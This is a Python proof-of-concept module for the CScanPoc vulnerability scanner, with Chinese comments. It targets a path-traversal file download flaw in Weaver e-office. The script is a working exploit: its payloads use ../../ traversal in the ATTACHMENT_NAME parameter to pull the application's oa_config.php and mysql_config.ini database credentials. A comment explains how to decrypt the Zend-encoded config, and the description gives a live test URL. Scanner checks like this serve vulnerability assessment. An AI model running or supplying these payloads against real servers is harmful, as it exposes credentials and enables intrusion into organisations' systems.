# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'weaver_0053'  # 平台漏洞编号，留空
    name = '泛微e-office 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2013-10-11'  # 漏洞公布时间
    desc = '''
        测试链接 [php]http://eoffice8.weaver.cn:8028/inc/attach.php?OP=1&ATTACHMENT_NAME=index.php&ATTACHMENT_ID=5402024843[/php]

        其中，参数 ATTACHMENT_NAME 未有效的控制其范围，导致任意文件下载。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/797/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e42d7cb8-9b7e-4adb-8c6e-c460ca373da'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 配置文件下载（程序zend加密，在网站http://www.showmycode.com/中可以解密）
            payload1 = '/inc/attach.php?OP=1&ATTACHMENT_NAME=../../inc/oa_config.php&ATTACHMENT_ID=5402024843'
            # 数据库连接文件下载
            payload2 = '/inc/attach.php?OP=1&ATTACHMENT_NAME=../../mysql_config.ini&ATTACHMENT_ID=5402024843'
            url = self.target + payload1
            r = requests.get(url)

            if r.status_code == 200 and 'oa_config' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
